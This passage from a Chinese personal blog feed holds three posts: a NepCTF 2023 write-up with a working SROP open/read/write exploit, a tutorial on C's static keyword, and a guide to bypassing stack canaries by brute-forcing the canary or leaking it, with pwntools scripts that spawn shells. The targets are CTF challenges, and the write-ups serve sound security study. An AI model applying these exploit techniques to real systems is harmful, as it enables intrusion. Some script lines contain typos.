        <content type="html"><![CDATA[<h2 id="NepCTF-2023"><a href="#NepCTF-2023" class="headerlink" title="NepCTF 2023"></a>NepCTF 2023</h2><p>为什么开赛两分钟选择不打了？<br>答案很简单：<del>签到题格式打错了…运营姐姐没回我…48h…</del><br>炮灰pwn不会做！！！（其实可以做misc）</p><h3 id="Msic"><a href="#Msic" class="headerlink" title="Msic"></a>Msic</h3><h4 id="code"><a href="#code" class="headerlink" title="code"></a>code</h4><p>题目提示flag在环境变量中 <del>开始STFW</del><br><a href="https://blog.csdn.net/aspnet_lyc/article/details/20548767">https://blog.csdn.net/aspnet_lyc/article/details/20548767</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** arge)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span>(*arge)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, *arge++);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230814162812545.png" alt="image-20230814162812545"></p><h4 id="与AI共舞的哈夫曼"><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a>与AI共舞的哈夫曼</h4><p>求助chat因为不会用<del>copilot</del></p><h4 id="ConnectedFive"><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h4><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230814174205317.png" alt="image-20230814174205317"></p><p>五子棋 不会写脚本干下吧hh（求助chat也不是不行）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">r = remote(<span class="string">&#x27;nepctf.1cepeak.cn&#x27;</span>, <span class="number">31762</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getboard</span>():</span><br><span class="line">    board = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        data = r.recvline().decode()[<span class="number">3</span>:].replace(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27; &#x27;</span>).strip()</span><br><span class="line">        data = data.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        board.append(data)</span><br><span class="line">    <span class="keyword">return</span> board</span><br><span class="line">table = <span class="string">&#x27;abcdefghijklmno&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    res = r.recvline().decode()</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">int</span>(res.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]) &gt;= <span class="number">38</span>):</span><br><span class="line">        r.interactive()</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    board = getboard()</span><br><span class="line">    random_x = random.randint(<span class="number">0</span>, <span class="number">14</span>)</span><br><span class="line">    random_y = random.randint(<span class="number">0</span>, <span class="number">14</span>)</span><br><span class="line">    <span class="keyword">while</span> board[random_y][random_x] != <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">        random_x = random.randint(<span class="number">0</span>, <span class="number">14</span>)</span><br><span class="line">        random_y = random.randint(<span class="number">0</span>, <span class="number">14</span>)</span><br><span class="line">    pos = table[random_x] + table[random_y]</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(pos)</span><br><span class="line">    r.recvline()</span><br></pre></td></tr></table></figure><h4 id="陌生的语言"><a href="#陌生的语言" class="headerlink" title="陌生的语言"></a>陌生的语言</h4><p>  根据提示A同学 开始bing 结果 竟然 看过 （我有罪）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230814195648669.png" alt="image-20230814195648669"></p><p>​    </p><h3 id="PWN复现"><a href="#PWN复现" class="headerlink" title="PWN复现"></a>PWN复现</h3><p>  不是我说 是真不会但是跟着复现cve 从中学到了很多</p><h4 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h4><p>题目提示classic pwn</p><p>先seccomp-tools查看是否有沙盒<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230816102445148.png" alt="image-20230816102445148"></p><p>really exist！<br>有沙盒，只能使用open，read，write函数. goto 0009中0009是return ALLOW说明允许执行.<br>若为goto 00010则被禁用. </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230816104100112.png" alt="image-20230816104100112"></p><p>​    注意是call syscall函数而不是直接syscall 所以寄存器会有偏移</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;nepctf.1cepeak.cn&quot;</span>,<span class="number">30307</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;welcome to NepCTF2023!&quot;</span>)</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400813</span></span><br><span class="line">syscall = <span class="number">0x4005B0</span></span><br><span class="line">bss_addr = elf.bss(<span class="number">0x500</span>)</span><br><span class="line">read_function = SigreturnFrame()</span><br><span class="line">read_function.rdi = <span class="number">0</span></span><br><span class="line">read_function.rsi = <span class="number">0</span></span><br><span class="line">read_function.rdx = bss_addr-<span class="number">0x8</span></span><br><span class="line">read_function.rcx = <span class="number">0x500</span></span><br><span class="line">read_function.rip = syscall</span><br><span class="line">read_function.rsp = bss_addr</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(syscall)+<span class="built_in">bytes</span>(read_function)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span> = SigreturnFrame()</span><br><span class="line"><span class="built_in">open</span>.rdi = <span class="number">2</span></span><br><span class="line"><span class="built_in">open</span>.rsi = bss_addr-<span class="number">0x8</span></span><br><span class="line"><span class="built_in">open</span>.rdx = <span class="number">0</span></span><br><span class="line"><span class="built_in">open</span>.rcx = <span class="number">0</span></span><br><span class="line"><span class="built_in">open</span>.rip = syscall</span><br><span class="line"><span class="built_in">open</span>.rsp = bss_addr + <span class="number">0x110</span></span><br><span class="line"></span><br><span class="line">read_function = SigreturnFrame()</span><br><span class="line">read_function.rdi = <span class="number">0</span></span><br><span class="line">read_function.rsi = <span class="number">3</span></span><br><span class="line">read_function.rdx = bss_addr - <span class="number">0x200</span></span><br><span class="line">read_function.rcx = <span class="number">0x100</span></span><br><span class="line">read_function.rip = syscall</span><br><span class="line">read_function.rsp = bss_addr + <span class="number">0x220</span></span><br><span class="line"></span><br><span class="line">write_funtion = SigreturnFrame()</span><br><span class="line">write_funtion.rdi = <span class="number">1</span></span><br><span class="line">write_funtion.rsi = <span class="number">1</span></span><br><span class="line">write_funtion.rdx = bss_addr - <span class="number">0x200</span></span><br><span class="line">write_funtion.rcx = <span class="number">0x100</span></span><br><span class="line">write_funtion.rip = syscall</span><br><span class="line">write_funtion.rsp = bss_addr+<span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span>+p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(syscall)+<span class="built_in">bytes</span>(<span class="built_in">open</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x108</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(syscall)+<span class="built_in">bytes</span>(read_function)</span><br><span class="line">payload = payload.ljust(<span class="number">0x208</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(pop_rdi)+p64(<span class="number">0xf</span>)+p64(syscall)+<span class="built_in">bytes</span>(write_funtion)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><p>Nepctf{SROP_IT_IS_EAsY_6ee3e57b-3982-4924-844a-d362c3006b20}</p>]]></content>
      
      
      <categories>
          
          <category> 题目记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn,知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C探索碎片——关键字static作用</title>
      <link href="/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/"/>
      <url>/2023/09/01/C%E6%8E%A2%E7%B4%A2%E7%A2%8E%E7%89%87%E2%80%94%E2%80%94static%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p>static意译是静态的，而作为C语言中常见的关键字之一，它的用法也贴切“静态”这一含义。</p><h2 id="二、用法"><a href="#二、用法" class="headerlink" title="二、用法"></a>二、用法</h2><ol><li><ul><li><strong>修饰局部变量</strong></li></ul></li></ol><p>下为static是否修饰局部变量对程序运行结果影响的对比。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">play</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">6</span>;</span><br><span class="line">    a++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        play();</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/cb3a80ccb2c62eeceb98bffabadbb269.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>此为上图static未修饰局部变量的运行结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">play</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> a = <span class="number">6</span>;</span><br><span class="line">    a++;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">5</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        play();</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/4b420992488352dce723db40cb016674.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>此为static修饰局部变量的运行结果</p><p>由上述的对比观察可得：static修饰局部变量时改变了被修饰（静态局部）变量的生命周期。</p><p>我们知道局部变量的生命周期是进作用域开始，出作用域结束，而其作用域是变量所在的局部范围。深入剖析来说，static修饰局部变量时改变了变量的存储类型。将本来存储在栈区的局部变量存放在了静态区。存储类型的改变使得其生命周期变长，但并不影响变量的作用域。</p><h4 id="2-修饰全局变量"><a href="#2-修饰全局变量" class="headerlink" title="2.修饰全局变量"></a>2.修饰全局变量</h4><p>下为static是否修饰全局变量对程序运行结果影响的对比。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/b8b3d989de9c69ddbf491862d2066dc0.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><blockquote><p>用extern声明外部符号使得在两个文件中可以达到“一次定义，多次声明”的效果。<br> 注意：extern只能用来声明全局变量！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/1215a0c458837f0883569331440183c5.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>当用static修饰全局变量后，程序报错无法运行。</p><p>已知全局变量具有外部链接属性，上图对比分析得：static修饰全局变量之后将其（静态全局变量）外部链接属性变成了内部链接属性。此时的全局变量只能在自己所在的.C文件中使用，对其他文件无法链接使用。即static对全局变量进行修饰改变了其作用域的范围，由原来的整个工程可见变为本源文件可见。</p><h4 id="3-修饰函数"><a href="#3-修饰函数" class="headerlink" title="3.修饰函数"></a>3.修饰函数</h4><p>下为static是否修饰全局变量对程序运行结果影响的对比。</p><p><img src="https://img-blog.csdnimg.cn/img_convert/a2a0dd86fadcd5cc30ec0d88437f5fae.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p><img src="https://img-blog.csdnimg.cn/img_convert/e00d77cdfa029bdbe513811525802465.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>此为为被static修饰时程序运行结果</p><p><img src="https://img-blog.csdnimg.cn/img_convert/436508929245bdfd15f062208af6e666.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><p>程序报错 无法运行</p><p>函数也具有外部链接属性，由上分析可得相同结论：static修饰函数（静态函数）后将其外部链接属性变为内部链接属性，无法链接使用，只可在自己所在.c文件中使用。</p><h4 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h4><p>static修饰局部变量时将其生命周期延长但作用域未发生改变。</p><p>static修饰全局变量和函数时将其外部链接属性变为内部链接属性，使其只能在所在文件中使用。</p><h4 id="四、补充"><a href="#四、补充" class="headerlink" title="四、补充"></a>四、补充</h4><p>以下内容只为简单提到，后续学习过程中会专门做分享探讨。</p><h5 id="1-有关C语言内存分区"><a href="#1-有关C语言内存分区" class="headerlink" title="1.有关C语言内存分区"></a>1.有关C语言内存分区</h5><p><img src="https://img-blog.csdnimg.cn/img_convert/b90c659e4affce80d1838890434a951f.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑</p><h5 id="2-有关C语言三种链接属性"><a href="#2-有关C语言三种链接属性" class="headerlink" title="2.有关C语言三种链接属性"></a>2.有关C语言三种链接属性</h5><p>链接属性（linkage）分为三种——外部（external）、内部（internal）、无（none）。</p><p>注意：*链接属性的改变不会改变作用域。</p><p>*链接属性意味着能不能访问变量及能不能在文件中定义同名变量或函数名。</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Canary解决姿势</title>
      <link href="/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/"/>
      <url>/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="Canary解决姿势"><a href="#Canary解决姿势" class="headerlink" title="Canary解决姿势"></a><strong>Canary解决姿势</strong></h2><p>被折磨的有点难受 找个时间来斩杀（bushi）又是被虐的一天~<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/QQ%E5%9B%BE%E7%89%8720230627202644.jpg"></p><hr><p><u>有问题请指正~</u>❀<br><u>获取例题请在评论区留言或私信我</u>⭐</p><h4 id="一、canary爆破"><a href="#一、canary爆破" class="headerlink" title="一、canary爆破"></a><strong>一、canary爆破</strong></h4><p>标志提示就算fork函数吧 多线程开攻</p><p><strong>【funcannary】</strong>*</p><p>（1）先运行一下 peda配套checksec<br>                       <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002528552.png" alt="image-20230530002528552"><br>                       根据题目提示’have fun’和’welcome’在爆破的exp中会用作于覆盖节点</p><p>​                              ​<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002620435.png" alt="image-20230530002620435"> </p><p>​         发现Canary和PIE都开 准备好爆破（如果有可以利用的字符串canary也可以绕过）<br>​         对应随机化 后续在IDA中只能利用其地址计算偏移</p><p>（2）进IDA </p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530002919532.png" alt="image-20230530002919532"></p><p>fork接口 &#x3D;&#x3D; canary爆破（多线程）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154247901.png" alt="image-20230530154247901"></p><p>发现函数入口为0x122D 并且发现”&#x2F;bin&#x2F;cat flag” 接下来找溢出位置爆破cannary</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530154947024.png" alt="image-20230530154947024"></p><p>明显溢出 定位该函数sub_128A（爆破canary的位置）爆破成功后爆返回地址 （爆canary地址的下一位）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230530155540402.png" alt="image-20230530155540402"></p><p>函数入口为0x122D shell返回地址为1329 偏移为0xfc(0x1329-0x122D) 覆盖的buf大小为0x68</p><p><strong>tips</strong><br>【1】canary大小为0x00-0xff 所以爆破时每字节需循环257次 又因为canary低三位定为\x00（32位爆破循环3次 64位循环7次）此处需循环7次<br>【2】程序入口点一般都是整数，即地址最低位为00，也就是这里的地址，0x29是可信的。就只要爆破后一位就OK，再后面的地址都相同，爆不爆都一样。</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *   </span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./fun&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;39.106.65.236&quot;, &quot;30687&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>) </span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line"><span class="comment">#canary</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  info(<span class="string">f&#x27;No:<span class="subst">&#123;K+<span class="number">1</span>&#125;</span>start,finding...&#x27;</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">     p.send(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>-<span class="number">8</span>)+cannary+btyes([i]))</span><br><span class="line">     recv = p.recvuntil(<span class="string">b&#x27;welcome\n&#x27;</span>)</span><br><span class="line">     <span class="keyword">if</span> <span class="string">b&quot;have fun&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">      cannary += <span class="built_in">bytes</span>([i])</span><br><span class="line">      success(<span class="string">f&quot;canary =&gt; <span class="subst">&#123;canary.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">      </span><br><span class="line"><span class="comment">#return address</span></span><br><span class="line">re_1 = <span class="number">0x29</span></span><br><span class="line">re_2 = <span class="number">0</span></span><br><span class="line">info(<span class="string">&#x27;finding:re_2 ...&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> re_i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">  payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p8(re_1) + p8(re_i)</span><br><span class="line"><span class="comment">#p8()将给定的整数转换为单字节的字节串</span></span><br><span class="line">  p.send(payload)</span><br><span class="line">  recv = p.recvuntil(<span class="string">b&quot;welcome\n&quot;</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">b&quot;have fun&quot;</span> <span class="keyword">in</span> recv:</span><br><span class="line">       re_2 = re_i</span><br><span class="line">       success(<span class="string">f&quot;re_2 =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(re_2)&#125;</span>&quot;</span>)</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x70</span>-<span class="number">8</span>) + canary + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p8(re_1 - <span class="number">1</span>) + p8(re_2 - <span class="number">1</span>)<span class="comment">#-1对齐栈</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="二、覆盖截断字符（-x00）获取canary"><a href="#二、覆盖截断字符（-x00）获取canary" class="headerlink" title="二、覆盖截断字符（\x00）获取canary"></a>二、覆盖截断字符（\x00）获取canary</h4><p>思路：<br>$构造第一次溢出，覆盖canary的低字节\x00，读出canary的值.<br>$构造第二次溢出，利用获取的canary构造payload，get shell.<br>【babypie】<br>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628164526442.png" alt="image-20230628164526442"></p><p>（2）IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628170950596.png" alt="image-20230628170950596"></p><p>  两次read溢出</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628171033720.png" alt="image-20230628171033720"></p><p>NX打开有可利用的system（”&#x2F;bin&#x2F;sh”）<br>PIE打开后低地址始终不变，可以碰运气（buhsi(●’◡’●)）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628172653111.png" alt="image-20230628172653111"></p><p>canary以\x00结尾（为防止被读出）那我们就溢出覆盖\x00再通过print函数打印出canary<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230628173716094.png" alt="image-20230628173716094"></p><p>0x30-0x8 &#x3D; 40，再+1覆盖\x00<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh = process(&#x27;./babypie&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29536</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x29</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#先整canary</span></span><br><span class="line">sh.sendafter(<span class="string">b&#x27;Input your Name:\n&#x27;</span>,payload)</span><br><span class="line">sh.recv(<span class="number">6</span> + <span class="number">40</span>)<span class="comment">#读取6个字节（即程序的回应消息）和40个字节（即程序返回的canary值）</span></span><br><span class="line">canary = u64(sh.recv(<span class="number">8</span>)) &amp; (<span class="number">0xffffffffffffff00</span>)<span class="comment">#末尾清0以保持与程序内部的字节对齐</span></span><br><span class="line">log.success(<span class="string">&#x27;canary:%x \n&#x27;</span>,canary)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">40</span> + p64(canary)  + p64(<span class="number">0</span>)+ <span class="string">b&#x27;\x42&#x27;</span></span><br><span class="line"><span class="comment">#p64(0)将栈上的返回地址替换为0，从而绕过内存保护机制</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 